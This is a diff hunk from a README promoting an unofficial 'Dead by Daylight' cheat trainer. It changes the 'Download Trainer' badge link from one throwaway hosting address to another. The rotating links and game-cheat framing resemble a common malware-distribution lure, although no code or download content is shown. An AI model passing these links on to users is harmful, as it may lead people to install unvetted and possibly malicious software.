@@ -6,7 +6,7 @@
 
 🎯 Whether you're the hunter or hunted — **you’re in charge** now.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload17.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Dead-by-Daylight-Trainer-ri3.github.io/.github)
 ---
 
 ## 🔥 Trainer Features Breakdown
